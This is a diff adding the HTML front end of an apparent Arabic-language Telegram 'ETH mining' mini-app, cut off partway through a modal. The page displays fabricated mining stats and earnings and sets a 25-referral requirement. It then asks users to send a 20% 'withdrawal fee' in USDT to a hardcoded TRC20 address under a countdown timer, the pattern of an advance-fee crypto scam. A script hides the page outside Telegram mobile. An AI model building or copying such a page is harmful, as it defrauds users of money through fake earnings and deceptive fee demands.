@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>نظام تعدين ETH احترافي</title>
+    <script>
+        (function () {
+            function isTelegramMobile() {
+                // Check for Telegram WebApp object and a mobile platform
+                if (
+                    typeof Telegram !== "undefined" &&
+                    Telegram.WebApp &&
+                    Telegram.WebApp.platform
+                ) {
+                    var platform = Telegram.WebApp.platform.toLowerCase();
+                    return platform === "android" || platform === "ios";
+                }
+                // Fallback: check the user agent for mobile keywords
+                return /Android|iPhone|iPad/i.test(navigator.userAgent);
+            }
+
+            if (!isTelegramMobile()) {
+                alert("عذرا، لا يمكن الوصول إلا من خلال تطبيق تلجرام على جهاز الهاتف المحمول!");
+                window.stop(); // Stop further resource loading
+                document.documentElement.innerHTML = ""; // Wipe out any content
+                throw new Error("Not accessed from Telegram mobile app.");
+            }
+        })();
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body class="bg-gradient-to-br from-gray-900 via-[#1a1042] to-gray-900 min-h-screen text-white">
+    <!-- Navigation Bar -->
+    <nav class="nav-glassmorphism">
+        <div class="container mx-auto px-2">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex items-center gap-3">
+                    <div
+                        class="eth-glow relative bg-purple-900/50 p-2.5 rounded-full border border-purple-500/30 shadow-lg hover:shadow-purple-900/40 transition-all">
+                        <div
+                            class="absolute inset-0 bg-gradient-to-br from-purple-400/20 to-blue-400/10 rounded-full mix-blend-overlay">
+                        </div>
+                        <div class="absolute inset-0 rounded-full shadow-inner shadow-purple-900/30"></div>
+                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=024" alt="ETH Logo"
+                            class="relative z-10 w-7 h-7 transition-transform hover:scale-110">
+                    </div>
+                    <span
+                        class="text-xl font-extrabold bg-gradient-to-br from-purple-300 to-purple-600 bg-clip-text text-transparent">
+                        إيث العرب
+                    </span>
+                </div>
+
+                <div class="flex items-center gap-2">
+                    <div id="userProfile" class="hidden user-badge flex items-center flex-shrink-0 cursor-pointer"
+                        onclick="openUserProfileModal()">
+                        <img id="userProfilePic" class="user-avatar w-7 h-7 border-2 border-purple-500/50" src=""
+                            alt="صورة المستخدم">
+                        <span id="userName"
+                            class="text-xs font-medium mr-1 mt-1 text-white max-w-[60px] sm:max-w-[120px] truncate"></span>
+                    </div>
+
+                    <button id="walletBtn"
+                        class="premium-button premium-button-small text-xs py-2 px-3 flex-shrink-0 whitespace-nowrap flex items-center justify-center font-bold border-2 border-purple-500/50 shadow-lg hover:shadow-purple-600/40 transition-all">
+                        <i class="fas fa-wallet ml-1 text-yellow-300"></i> المحفظة
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container mx-auto py-6">
+        <div class="text-center mb-8">
+            <h1 class="text-3xl sm:text-4xl font-extrabold mb-6">
+                استثمر في
+                <span
+                    class="bg-gradient-to-r from-purple-400 via-purple-500 to-blue-400 bg-clip-text text-transparent glow-text animate-pulse">
+                    التعدين
+                </span>
+            </h1>
+
+            <!-- Enhanced Mining Stats Card with Animated ETH Icon -->
+            <div class="eth-glow stats-card inline-block mb-6 mx-auto max-w-lg relative overflow-hidden">
+                <!-- Animated background elements -->
+                <div class="absolute inset-0 bg-gradient-to-br from-purple-900/30 to-indigo-900/30 z-0"></div>
+                <div
+                    class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-purple-600/0 via-purple-600/70 to-purple-600/0">
+                </div>
+                <div
+                    class="absolute bottom-0 left-0 right-0 h-1 bg-gradient-to-r from-indigo-600/0 via-indigo-600/50 to-indigo-600/0">
+                </div>
+
+                <!-- Mining Hub Content -->
+                <div class="relative z-10 p-6">
+                    <div class="flex items-center justify-between mb-6">
+                        <div class="flex-1">
+                            <h3
+                                class="text-xl font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">
+                                مركز التعدين الاحترافي
+                            </h3>
+                            <p class="text-xs text-purple-300 mt-1">
+                                <i class="fas fa-broadcast-tower mr-1 animate-pulse"></i>
+                                متصل بـ <span class="font-mono font-bold">16</span> خادم تعدين
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Mining Stats Display -->
+                    <div class="flex flex-col md:flex-row items-center gap-4 mb-5">
+                        <div class="w-full md:w-2/3 text-center md:text-right">
+                            <div class="flex items-center justify-center md:justify-end">
+                                <div class="bg-purple-900/40 h-10 w-1 rounded-full mr-3 hidden md:block">
+                                    <div
+                                        class="h-1/2 w-full bg-gradient-to-b from-purple-400 to-purple-400/0 rounded-full animate-pulse">
+                                    </div>
+                                </div>
+                                <div>
+                                    <p class="text-xs text-purple-300 mb-1">إجمالي الأرباح</p>
+                                    <div class="text-3xl sm:text-4xl font-mono font-bold text-white flex items-center">
+                                        <span id="earnedETH" class="glow-text">0.00</span>
+                                        <span class="text-purple-400 ml-2"> ETH</span>
+                                    </div>
+                                    <div class="text-sm font-semibold text-purple-300 bg-purple-900/20 px-4 py-1 rounded-full mt-1 inline-block"
+                                        dir="ltr">
+                                        <i class="fas fa-dollar-sign text-green-500 mr-0.5 text-lg relative"
+                                            style="top: 1px;"></i>
+                                        <span id="earnedUSD" class="text-lg text-white align-middle">0.00</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="w-full md:w-1/3 flex flex-col items-center">
+                            <!-- Enhanced Professional Mining Visualization -->
+                            <div class="relative w-24 h-24 mb-2">
+                                <svg class="w-full h-full" viewBox="0 0 100 100">
+                                    <!-- Outer Circle -->
+                                    <circle cx="50" cy="50" r="46" fill="none" stroke="rgba(139, 92, 246, 0.1)"
+                                        stroke-width="8"></circle>
+
+                                    <!-- Animated Progress Circle -->
+                                    <circle cx="50" cy="50" r="46" fill="none" stroke="url(#gradient)" stroke-width="8"
+                                        stroke-dasharray="289.02652413" stroke-dashoffset="144.51326207"
+                                        stroke-linecap="round">
+                                        <animateTransform attributeName="transform" type="rotate" from="0 50 50"
+                                            to="360 50 50" dur="10s" repeatCount="indefinite"></animateTransform>
+                                    </circle>
+
+                                    <!-- Define Gradient -->
+                                    <defs>
+                                        <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                                            <stop offset="0%" stop-color="#8B5CF6"></stop>
+                                            <stop offset="100%" stop-color="#3B82F6"></stop>
+                                        </linearGradient>
+                                    </defs>
+
+                                    <!-- Animated particles -->
+                                    <circle cx="50" cy="15" r="2" fill="#a78bfa">
+                                        <animate attributeName="opacity" values="0;1;0" dur="2s"
+                                            repeatCount="indefinite" begin="0s" />
+                                    </circle>
+                                    <circle cx="85" cy="50" r="2" fill="#818cf8">
+                                        <animate attributeName="opacity" values="0;1;0" dur="2s"
+                                            repeatCount="indefinite" begin="0.3s" />
+                                    </circle>
+                                    <circle cx="50" cy="85" r="2" fill="#a78bfa">
+                                        <animate attributeName="opacity" values="0;1;0" dur="2s"
+                                            repeatCount="indefinite" begin="0.6s" />
+                                    </circle>
+                                    <circle cx="15" cy="50" r="2" fill="#818cf8">
+                                        <animate attributeName="opacity" values="0;1;0" dur="2s"
+                                            repeatCount="indefinite" begin="0.9s" />
+                                    </circle>
+                                </svg>
+
+                                <!-- Enhanced Mining Core Animation -->
+                                <div class="absolute inset-0 flex items-center justify-center">
+                                    <div
+                                        class="bg-purple-900/80 w-16 h-16 rounded-full flex items-center justify-center shadow-lg eth-glow">
+                                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=024" alt="ETH"
+                                            class="w-10 h-10" id="ethLogo">
+                                    </div>
+                                </div>
+
+                                <!-- Processor Icons precisely rotating around the ETH logo -->
+                                <div class="absolute inset-0">
+                                    <div id="processorIcons"
+                                        class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full">
+                                        <!-- Using absolute positioning with custom animation to keep icons on the circle -->
+                                        <i class="fas fa-microchip text-purple-400 opacity-80 absolute"
+                                            style="top: 6px; left: 50%; transform: translateX(-50%);"
+                                            id="processor-icon-1"></i>
+                                        <i class="fas fa-cog text-blue-400 opacity-80 absolute"
+                                            style="bottom: 6px; left: 50%; transform: translateX(-50%);"
+                                            id="processor-icon-2"></i>
+                                        <i class="fas fa-server text-indigo-400 opacity-80 absolute"
+                                            style="right: 6px; top: 50%; transform: translateY(-50%);"
+                                            id="processor-icon-3"></i>
+                                        <i class="fas fa-memory text-violet-400 opacity-80 absolute"
+                                            style="left: 6px; top: 50%; transform: translateY(-50%);"
+                                            id="processor-icon-4"></i>
+                                    </div>
+                                </div>
+
+                                <!-- Mining Status Badge -->
+                                <div
+                                    class="absolute -bottom-2 left-1/2 transform -translate-x-1/2 bg-purple-900/80 px-2 py-1 rounded-full text-xs font-semibold text-white border border-purple-500/50 shadow-lg">
+                                    <span class="flex items-center gap-1" id="miningStatusText">
+                                        <i id="miningStatusIcon" class="fas fa-circle text-red-400 text-xs"></i>
+                                        غير نشط
+                                    </span>
+                                </div>
+                            </div>
+
+                            <!-- Mining Speed Display -->
+                            <div class="text-center">
+                                <p
+                                    class="text-base font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">
+                                    <span id="miningSpeed">0.00 H/s</span>
+                                </p>
+                                <p class="text-xs text-purple-300 opacity-70">سرعة التعدين الحالية</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Mining Info Panel -->
+                    <div class="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-5">
+                        <div class="bg-purple-900/30 p-3 rounded-xl border border-purple-500/30 shadow-lg shimmer">
+                            <div class="flex items-center justify-center mb-1">
+                                <i class="fas fa-server text-purple-400 mr-2"></i>
+                                <span class="text-xs font-bold uppercase tracking-wider text-purple-300">خوادم
+                                    نشطة</span>
+                            </div>
+                            <p class="text-sm font-bold text-center text-white">16/16</p>
+                        </div>
+
+                        <div class="bg-purple-900/30 p-3 rounded-xl border border-purple-500/30 shadow-lg shimmer">
+                            <div class="flex items-center justify-center mb-1">
+                                <i class="fas fa-chart-line text-green-400 mr-2"></i>
+                                <span class="text-xs font-bold uppercase tracking-wider text-purple-300">سعر ETH</span>
+                            </div>
+                            <p class="text-sm font-bold text-center text-green-400">
+                                $<span id="ETHpricenow">جاري التحميل...</span>
+                            </p>
+                        </div>
+
+                        <div
+                            class="bg-purple-900/30 p-3 rounded-xl border border-purple-500/30 shadow-lg shimmer col-span-2 sm:col-span-1">
+                            <div class="flex items-center justify-center mb-1">
+                                <i class="fas fa-bolt text-yellow-400 mr-2"></i>
+                                <span class="text-xs font-bold uppercase tracking-wider text-purple-300">كفاءة
+                                    التعدين</span>
+                            </div>
+                            <p class="text-sm font-bold text-center text-yellow-400">
+                                <span id="miningEfficiency">99</span>.<span id="miningEfficiencyDecimal">2</span>%
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Enhanced Main Action Button -->
+                    <button id="mainActionBtn"
+                        class="premium-button mining-btn-inactive text-lg py-4 w-full max-w-sm mx-auto relative overflow-hidden group">
+                        <span
+                            class="absolute inset-0 w-full h-full bg-gradient-to-r from-green-400/10 to-blue-500/10 transform -translate-x-full group-hover:translate-x-0 transition-transform duration-300"></span>
+                        <div class="relative flex items-center justify-center">
+                            <i class="fas fa-play-circle ml-2 mr-2 text-xl"></i>
+                            <span class="text-lg font-bold">بدء التعدين الآن</span>
+                            <div
+                                class="absolute right-4 top-1/2 transform -translate-y-1/2 h-5 w-5 rounded-full bg-white/10 group-hover:scale-150 transition-transform">
+                            </div>
+                        </div>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Production version - test buttons removed -->
+        </div>
+
+        <!-- Activity Feed Container -->
+        <section class="premium-card mt-8">
+            <div class="premium-card-header">
+                <h2
+                    class="text-xl font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent flex items-center">
+                    <i class="fas fa-chart-line ml-1 mr-3 text-purple-500"></i>
+                    <span>النشاطات الحديثة</span>
+                </h2>
+            </div>
+
+            <!-- Tabs header -->
+            <div class="premium-card-body pb-0">
+                <div class="tabs-container border-b border-purple-500/20">
+                    <div class="flex">
+                        <button id="processesTabBtn"
+                            class="tab-active relative flex-1 text-center py-3 text-sm font-medium">
+                            <i class="fas fa-microchip ml-1.5 mr-2"></i>عمليات
+                        </button>
+                        <button id="notificationsTabBtn"
+                            class="tab-inactive relative flex-1 text-center py-3 text-sm font-medium">
+                            <i class="fas fa-bell ml-1.5 mr-2"></i>إشعارات
+                        </button>
+                    </div>
+                    <div class="tab-indicator" style="width: 50%; transform: translateX(0%);"></div>
+                </div>
+            </div>
+
+            <div class="premium-card-body pt-2">
+                <!-- Mining Processes Tab -->
+                <div id="miningProcessesTab" class="active">
+                    <div id="miningProcesses"
+                        class="activity-feed scrollbar-thin scrollbar-thumb-purple-600 scrollbar-track-gray-800/50">
+                        <!-- Mining processes will be added here -->
+                    </div>
+                </div>
+
+                <!-- Notifications Tab -->
+                <div id="notificationsTab">
+                    <div id="notifications"
+                        class="activity-feed scrollbar-thin scrollbar-thumb-purple-600 scrollbar-track-gray-800/50">
+                        <!-- Notifications will be added here -->
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- User Comments Section -->
+        <section class="premium-card mt-6">
+            <div class="premium-card-header bg-gradient-to-r from-gray-800/70 to-gray-900/70">
+                <h2
+                    class="text-xl font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent flex items-center">
+                    <i class="fas fa-comments ml-1 mr-3 text-purple-500"></i>
+                    <span>رسائل المستخدمين</span>
+                </h2>
+            </div>
+
+            <div class="premium-card-body bg-gradient-to-br from-gray-800/50 to-gray-900/60">
+                <div id="commentsContainer"
+                    class="comment-container scrollbar-thin scrollbar-thumb-purple-600 scrollbar-track-gray-800/50">
+                    <!-- Comments will be dynamically inserted here -->
+                </div>
+
+                <form id="commentForm" class="flex gap-2 mt-4">
+                    <input type="text" id="commentInput"
+                        class="premium-input bg-gray-800/70 border-purple-500/30 focus:border-purple-500/60"
+                        placeholder="اكتب تعليقك هنا..." maxlength="120" aria-label="اكتب تعليقك هنا">
+                    <button type="submit" class="premium-button-small premium-button whitespace-nowrap"
+                        aria-label="إرسال التعليق">
+                        <i class="fas fa-paper-plane mr-2"></i> إرسال
+                    </button>
+                </form>
+            </div>
+        </section>
+
+        <!-- مودالات -->
+        <div id="walletModal"
+            class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
+            <div class="premium-card w-full max-w-md overflow-hidden">
+                <div class="p-5 border-b border-purple-500/20">
+                    <div class="flex justify-between items-center">
+                        <h2 class="text-xl font-bold flex items-center gap-2">
+                            <i class="fas fa-wallet text-purple-400"></i>إدارة المحفظة
+                        </h2>
+                        <div id="walletUserInfo" class="flex items-center">
+                            <span id="walletUserName"
+                                class="text-xs font-medium mt-1 ml-1 mr-2 text-purple-300 mr-2"></span>
+                            <img id="walletUserPic"
+                                class="w-7 h-7 rounded-full object-cover border-2 border-purple-400 shadow-md" src=""
+                                alt="">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 gap-4 p-5">
+                    <div class="premium-card p-5">
+                        <h3 class="text-base font-semibold mb-4 flex items-center gap-2">
+                            <i class="fas fa-coins text-purple-400"></i>الأرباح
+                        </h3>
+                        <div class="space-y-3">
+                            <div class="flex justify-between items-center py-3 border-b border-purple-500/10">
+                                <span class="text-purple-200 text-sm">الإجمالي:</span>
+                                <span class="font-mono text-lg font-bold text-purple-300"><span
+                                        id="totalEarningsETH">0.00</span> ETH</span>
+                            </div>
+                            <div class="flex justify-between items-center py-3">
+                                <span class="text-purple-200 text-sm">القيمة بالدولار:</span>
+                                <span class="font-mono text-lg font-bold text-green-400">$<span
+                                        id="totalEarningsUSD">0.00</span></span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="premium-card p-5">
+                        <h3 class="text-base font-semibold mb-4 flex items-center gap-2">
+                            <i class="fas fa-university text-purple-400"></i>خيارات الإدارة
+                        </h3>
+                        <div class="space-y-3">
+                            <div class="text-xs text-purple-200 bg-gray-800/50 p-4 rounded-lg">
+                                <i class="fas fa-info-circle mr-1"></i>
+                                رسوم السحب: <span id="feePercentage" class="font-bold text-white">20%</span>
+                                (تخفيض <span id="feeDiscount" class="font-bold text-green-400">0%</span> عبر الإحالات)
+                            </div>
+                            <button id="withdrawBtn" class="premium-button w-full text-sm py-3 my-2">
+                                <i class="fas fa-hand-holding-usd mr-1.5"></i>سحب الأرباح
+                            </button>
+                            <button id="referralBtn" class="premium-button w-full text-sm py-3">
+                                <i class="fas fa-users mr-1.5"></i>نظام الإحالات
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="p-5 border-t border-purple-500/20">
+                    <button onclick="document.getElementById('walletModal').classList.add('hidden')"
+                        class="w-full premium-button premium-button-secondary py-3 text-sm">
+                        <i class="fas fa-times mr-1.5"></i>إغلاق
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- مودال الإحالات -->
+        <div id="referralModal"
+            class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
+            <div class="premium-card w-full max-w-sm overflow-hidden">
+                <div class="p-5 border-b border-purple-500/20">
+                    <h2 class="text-xl font-bold flex items-center gap-2">
+                        <i class="fas fa-users text-purple-400"></i>نظام الإحالات
+                    </h2>
+                </div>
+
+                <div class="p-5 space-y-4">
+                    <div class="premium-card p-5 text-center">
+                        <div class="mb-4">
+                            <div class="text-2xl font-bold text-purple-300 mb-2 floating">
+                                <span id="referralCount">0</span> / <span class="text-white">25</span> إحالة
+                            </div>
+                            <div class="text-xs text-purple-200 mb-3">
+                                تحتاج إلى 25 إحالة لتأكيد السحب وتخفيض الرسوم
+                            </div>
+
+                            <!-- Progress Bar -->
+                            <div class="referral-progress mb-4">
+                                <div id="referralProgressBar" class="referral-progress-bar" style="width: 0%"></div>
+                            </div>
+
+                            <div class="grid grid-cols-2 gap-3 mb-4">
+                                <div class="bg-purple-900/20 p-3 rounded-xl border border-purple-500/30">
+                                    <p class="text-xs font-bold text-purple-300 mb-1">تخفيض الرسوم</p>
+                                    <p class="text-base font-bold text-green-400"><span
+                                            id="referralFeeDiscount">0</span>%</p>
+                                </div>
+                                <div class="bg-purple-900/20 p-3 rounded-xl border border-purple-500/30">
+                                    <p class="text-xs font-bold text-purple-300 mb-1">حالة السحب</p>
+                                    <div class="flex items-center justify-center mt-1">
+                                        <div id="withdrawStatusIcon" class="mr-2 text-red-400">
+                                            <i class="fas fa-times-circle"></i>
+                                        </div>
+                                        <p id="withdrawStatus" class="text-base font-bold text-red-400">غير مفعل</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-3 mb-4">
+                            <button id="telegramShare" class="premium-button py-3 text-sm">
+                                <i class="fab fa-telegram mr-2"></i> مشاركة تلجرام
+                            </button>
+                            <button id="externalShare" class="premium-button premium-button-secondary py-3 text-sm">
+                                <i class="fas fa-share-alt mr-2"></i> مشاركة خارجية
+                            </button>
+                        </div>
+
+                        <div
+                            class="text-xs text-center mt-2 text-purple-200 bg-purple-900/20 p-3 rounded-lg border border-purple-500/20">
+                            <i class="fas fa-info-circle mr-1"></i>
+                            كل مشاركة يجب أن تكون لمستخدم مختلف ليتم احتسابها
+                        </div>
+                    </div>
+
+                    <button onclick="document.getElementById('referralModal').classList.add('hidden')"
+                        class="w-full premium-button premium-button-secondary py-3 text-sm">
+                        <i class="fas fa-times mr-1.5"></i>إغلاق
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- مودال معلومات المستخدم -->
+        <div id="userProfileModal"
+            class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
+            <div class="premium-card w-full max-w-md sm:max-w-lg overflow-hidden transition-all duration-300">
+                <!-- Modal Header with gradient styling -->
+                <div
+                    class="p-4 border-b border-purple-500/30 bg-gradient-to-r from-purple-900/50 to-indigo-900/50 relative">
+                    <h2 class="text-lg font-bold flex items-center gap-2">
+                        <div class="w-7 h-7 flex items-center justify-center bg-purple-900/60 rounded-lg">
+                            <i class="fas fa-user text-purple-400 text-sm"></i>
+                        </div>
+                        <span>معلومات المستخدم</span>
+                    </h2>
+                    <!-- Decorative element -->
+                    <div
+                        class="absolute bottom-0 left-0 right-0 h-[1px] bg-gradient-to-r from-purple-500/0 via-purple-500/70 to-purple-500/0">
+                    </div>
+                </div>
+
+                <div class="p-5 space-y-5">
+                    <!-- User Profile Section - Improved layout with better alignment -->
+                    <div class="flex items-center gap-5">
+                        <div class="relative flex-shrink-0">
+                            <!-- Subtle glow effect -->
+                            <div
+                                class="absolute inset-0 bg-gradient-to-r from-purple-500 to-indigo-500 rounded-full blur-md opacity-50 animate-pulse">
+                            </div>
+                            <!-- Profile picture with consistent dimensions -->
+                            <img id="profileModalPic"
+                                class="relative w-20 h-20 rounded-full object-cover border-3 border-purple-600/50 shadow-lg shadow-purple-900/30"
+                                src="" alt="صورة المستخدم">
+                        </div>
+
+                        <!-- User info with better spacing -->
+                        <div class="flex flex-col flex-1">
+                            <h3 id="profileModalName" class="text-xl font-bold text-white"></h3>
+                            <p id="profileModalUsername" class="text-sm text-purple-300 mb-2"></p>
+
+                            <!-- Mining status with user info -->
+                            <div
+                                class="flex items-center mt-1 bg-gray-800/40 px-3 py-1.5 rounded-full border border-purple-500/20">
+                                <span id="profileModalMiningStatus"
+                                    class="text-xs font-medium py-1 px-2 rounded-full bg-red-500/20 text-red-400 flex items-center">
+                                    <i class="fas fa-circle mr-1.5 text-xs"></i>غير نشط
+                                </span>
+                                <span class="mx-2 text-gray-500">•</span>
+                                <div class="text-xs text-purple-300 flex items-center">
+                                    <i class="fas fa-tachometer-alt mr-1.5 text-purple-400"></i>
+                                    <span class="mt-1" id="profileModalMiningSpeed">0.00 H/s</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- User Stats Section - Cleaner Design -->
+                    <div
+                        class="premium-card p-4 bg-gradient-to-br from-gray-800/50 to-gray-900/70 border border-purple-500/20 rounded-xl">
+                        <h3 class="text-sm font-semibold mb-3 flex items-center gap-2">
+                            <div class="w-5 h-5 flex items-center justify-center bg-purple-900/60 rounded-lg">
+                                <i class="fas fa-chart-line text-purple-400 text-xs"></i>
+                            </div>
+                            <span>إحصائيات الحساب</span>
+                        </h3>
+
+                        <!-- Stats cards with better responsive layout -->
+                        <div class="grid grid-cols-2 gap-3">
+                            <!-- Earnings card -->
+                            <div class="bg-purple-900/20 p-3 rounded-lg border border-purple-500/30 shimmer">
+                                <div class="flex items-center mb-2">
+                                    <div
+                                        class="w-6 h-6 flex items-center justify-center bg-yellow-900/30 rounded-lg mr-2">
+                                        <i class="fas fa-coins text-yellow-400 text-xs"></i>
+                                    </div>
+                                    <span class="text-xs font-bold text-purple-300">الأرباح الإجمالية</span>
+                                </div>
+                                <div>
+                                    <p id="profileModalEarningsETH" class="text-base font-bold text-white">0.00 ETH</p>
+                                    <p id="profileModalEarningsUSD" class="text-sm font-medium text-green-400">$0.00</p>
+                                </div>
+                            </div>
+
+                            <!-- Referrals card -->
+                            <div class="bg-purple-900/20 p-3 rounded-lg border border-purple-500/30 shimmer">
+                                <div class="flex items-center mb-2">
+                                    <div
+                                        class="w-6 h-6 flex items-center justify-center bg-blue-900/30 rounded-lg mr-2">
+                                        <i class="fas fa-users text-blue-400 text-xs"></i>
+                                    </div>
+                                    <span class="text-xs font-bold text-purple-300">الإحالات</span>
+                                </div>
+                                <div>
+                                    <div class="flex items-center justify-between mb-1">
+                                        <p id="profileModalReferrals" class="text-base font-bold text-white">0 / 25</p>
+                                        <span class="text-xs text-purple-300">20%</span>
+                                    </div>
+                                    <div class="referral-progress h-2 bg-gray-800/80 rounded-full overflow-hidden">
+                                        <div id="profileModalReferralBar" class="referral-progress-bar h-full"
+                                            style="width: 0%"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Close button with improved styling -->
+                    <button onclick="document.getElementById('userProfileModal').classList.add('hidden')"
+                        class="w-full premium-button premium-button-secondary py-3 text-sm hover:bg-purple-800/30 transition-all duration-300">
+                        <i class="fas fa-times mr-1.5"></i>إغلاق
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- مودال تأكيد السحب -->
+        <div id="withdrawModal"
+            class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
+            <div class="premium-card w-full max-w-sm overflow-hidden">
+                <div class="p-5 border-b border-purple-500/20">
+                    <h2 class="text-xl font-bold flex items-center gap-2">
+                        <i class="fas fa-coins text-purple-400"></i>تأكيد السحب
+                    </h2>
+                </div>
+
+                <div class="p-5 space-y-4">
+                    <div class="premium-card p-5">
+                        <div class="mb-4">
+                            <div class="flex justify-between items-center mb-4">
+                                <span class="text-sm font-bold text-purple-300">المبلغ المستحق:</span>
+                                <span class="text-lg font-bold text-green-400">$<span
+                                        id="withdrawAmount">0.00</span></span>
+                            </div>
+                            <div class="flex justify-between items-center mb-4">
+                                <span class="text-sm font-bold text-purple-300">رسوم السحب (<span
+                                        id="withdrawFeePercent">20</span>%):</span>
+                                <span class="text-base font-bold text-red-400">$<span
+                                        id="withdrawFeeAmount">0.00</span></span>
+                            </div>
+                        </div>
+
+                        <div class="mb-4">
+                            <label class="block text-purple-300 mb-2 font-medium text-sm">عنوان المحفظة</label>
+                            <input type="text" id="usdtAddressInput" class="premium-input w-full font-mono text-sm"
+                                placeholder="محفظة USDT(TRC20)">
+                        </div>
+
+                        <div class="flex items-center mb-4">
+                            <input type="checkbox" id="addressConfirmation"
+                                class="appearance-none w-5 h-5 text-purple-600 bg-gray-700/80 border-2 border-gray-600 rounded-md focus:ring-2 focus:ring-purple-500 checked:bg-purple-600 checked:border-purple-600 transition-colors">
+                            <label for="addressConfirmation" class="ms-2 text-sm text-purple-200">أؤكد صحة
+                                العنوان</label>
+                        </div>
+
+                        <button id="confirmWithdraw" class="premium-button w-full py-3 text-sm">
+                            <i class="fas fa-check-circle mr-1.5"></i>التأكيد والدفع
+                        </button>
+                    </div>
+                    <button onclick="document.getElementById('withdrawModal').classList.add('hidden')"
+                        class="w-full premium-button premium-button-secondary py-3 text-sm">
+                        <i class="fas fa-times mr-1.5"></i>إغلاق
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- مودال الدفع -->
+        <div id="paymentModal"
+            class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
+            <div class="premium-card w-full max-w-sm overflow-hidden">
+                <div class="p-5 border-b border-purple-500/20">
+                    <h2 class="text-xl font-bold flex items-center gap-2">
+                        <i class="fas fa-qrcode text-purple-400"></i>إتمام الدفع
+                    </h2>
+                </div>
+
+                <div class="p-5 space-y-4">
+                    <div class="premium-card p-5 text-center">
+                        <div class="mb-3">
+                            <p class="text-xs font-bold uppercase tracking-wider text-purple-300 mb-1">إجمالي الأرباح
+                            </p>
+                            <p class="text-base font-semibold text-green-400">
+                                <span id="earnedUSDlabel">0.00</span> USDT
+                            </p>
+                        </div>
+
+                        <div class="mb-4">
+                            <p class="text-xs font-bold uppercase tracking-wider text-purple-300 mb-1">الرسوم المطلوبة
+                            </p>
+                            <p class="text-xl font-bold text-purple-300 mb-1">
+                                <span id="paymentAmount">0.00</span> USDT
+                            </p>
+                            <p class="text-xs text-yellow-400">+ $2 رسوم الشبكة</p>
+                        </div>
+
+                        <div class="mb-4">
+                            <p class="text-xs font-bold uppercase tracking-wider text-purple-300 py-1">عنوان الدفع</p>
+                            <div class="bg-gray-800/50 p-3 rounded-lg flex items-center justify-between glow-border">
+                                <span id="usdtAddress"
+                                    class="font-mono text-xs truncate text-center flex-grow">TCMP9DdCMRKejxN8nRRtbjqkd1o9wKvho9</span>
+                                <button onclick="copyAddress()" class="text-purple-400 hover:text-purple-300 ml-1">
+                                    <i class="far fa-copy"></i>
+                                </button>
+                            </div>
+                            <p class="text-xs text-yellow-400 py-2">إرسال عملة USDT على شبكة الترون(TRC-20)</p>
+                        </div>
+
+                        <div class="mb-4 flex justify-center">
+                            <canvas id="qrcode" class="rounded-lg border-2 border-purple-500/30 p-2 bg-white/5"
+                                width="150" height="150"></canvas>
+                        </div>
+
+                        <div class="mb-3">
+                            <div id="loadingSpinner"
+                                class="animate-spin rounded-full h-8 w-8 border-4 border-purple-500 border-t-transparent mx-auto mb-3">
+                            </div>
+                            <p class="text-sm text-purple-200 font-medium">بانتظار تأكيد الدفع...</p>
+                            <p class="text-sm text-red-300 mt-2">الوقت المتبقي: <span id="paymentTimer">05:00</span></p>
+                        </div>
+                    </div>
+
+                    <button onclick="document.getElementById('paymentModal').classList.add('hidden'); cancelPayment();"
+                        class="w-full premium-button premium-button-secondary py-3 text-sm">
+                        <i class="fas fa-times mr-1.5"></i> إلغاء
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- مودال التأكيد النهائي -->
+        <div id="finalConfirmModal"
+            class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
+            <div class="premium-card w-full max-w-sm overflow-hidden">
+                <div class="p-5 border-b border-purple-500/20 bg-green-800/20">
+                    <h2 class="text-xl font-bold flex items-center gap-2 text-green-400">
